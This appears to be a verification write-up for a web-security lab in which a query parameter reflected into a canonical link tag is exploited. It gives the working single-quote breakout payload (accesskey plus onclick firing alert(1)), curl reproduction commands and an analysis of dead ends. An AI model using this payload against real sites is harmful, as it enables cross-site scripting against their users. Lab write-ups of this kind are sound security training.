# Verification — Canonical link accesskey XSS

## Methodology
1. Reflection mapping (curl): query marker → canonical echo; path marker → 404
   (query-only vector on `/`).
2. Encoding map with `'"<>` in one probe (byte-read, not assumed).
3. Byte-exact template reconstruction (xxd): prove the closing-quote mechanics
   (`href='URL'/>`, suffix `'/>'`) rather than modeling them.
4. CDP handler-liveness attempt (`.click()` on the link) — ANOMALY recorded honestly.
5. Lab acceptance: real-browser navigation with the official-shape payload; banner polls.

## Evidence

### 1. Reflection (curl)
```
?search=CANONQ  → <link rel="canonical" href='https://…/?search=CANONQ'/>
/CANONPATH      → 404  (path must route; query carries the payload on /)
```

### 2. Encoding map (curl, `?search=ENC'"<>`)
```
href='https://…/?search=ENC'%22%3c%3e'/>
```
`'` raw; `"`→`%22`; `<`→`%3c`; `>`→`%3e`. URL-encoding, not HTML-encoding — the
operative consequence: tags/double-quotes dead, single-quote breakout live.

### 3. Byte-exact template (xxd)
- Home: `…net/` + `27 2f 3e` (`'/>'`) → template = `href='URL'/>` (suffix `'/>'`).
- Payload line: `…'accesskey='x'onclick='document.title=777001'/>` + `27 2f 3e` →
  `onclick='document.title=777001'` closed by the template quote, `/>` terminates.
  Structure VALID by bytes (this refutes the mid-session misread that the template
  contributed no closing quote).

### 4. CDP anomaly (recorded, unresolved, non-blocking)
Programmatic `.click()` on the `<link>` element (valid `onclick` per §3) did NOT
change the title headlessly, and `getAttribute` serialization suggested a trailing
`'/` in the value — contradicting the byte proof. Hypotheses (unresolved):
head-element click-dispatch quirk in automation, or a serialization artifact.
Resolution path taken: the byte structure + official solution + platform acceptance
converge, so the anomaly is documented as an automation quirk, not a payload defect.
Rule reinforced: when DOM introspection contradicts byte evidence, re-verify the
bytes (done — bytes win), then seek platform-level proof.

### 5. Lab acceptance
Real browser → `/?%27accesskey=%27x%27onclick=%27alert(1)` → platform-simulated
keypress → `alert(1)` → `is-solved` (first poll).

### 6. Dead-end analysis
| Candidate | Verdict | Basis |
|---|---|---|
| Tag injection (`<script>`, `<img>`) | dead | `%3c%3e` never decode into tags |
| `"`-breakout | dead | literal `%22` text inside the value |
| `autofocus`/`onfocus`/`onmouseover` on link | no fire path | non-rendered, non-focusable host; no trigger without keys |
| Path-based input (`/PAYLOAD`) | 404 | non-`/` paths don't route |
| Self-keypress in automation | unproven headlessly | CDP key dispatch not attempted (platform simulation sufficed) |

## Reproducibility
```
BASE=…
curl -s "$BASE/?search=ENC%27%22%3C%3E" | grep -oE "canonical[^>]*>"
curl -s "$BASE/?search=ZZZ" | grep -oE "canonical[^>]*>" | xxd | tail -3   # suffix '/>'
# acceptance: real-browser navigate to /?%27accesskey=%27x%27onclick=%27alert(1)
```

## Confirmation criteria
- CONFIRMED: query-only reflection, URL-encoding map, byte-exact template,
  real-browser acceptance via platform-simulated keypress.
- HONESTLY OPEN: headless `.click()`-on-`<link>` non-fire (automation quirk,
  structure proven valid independently).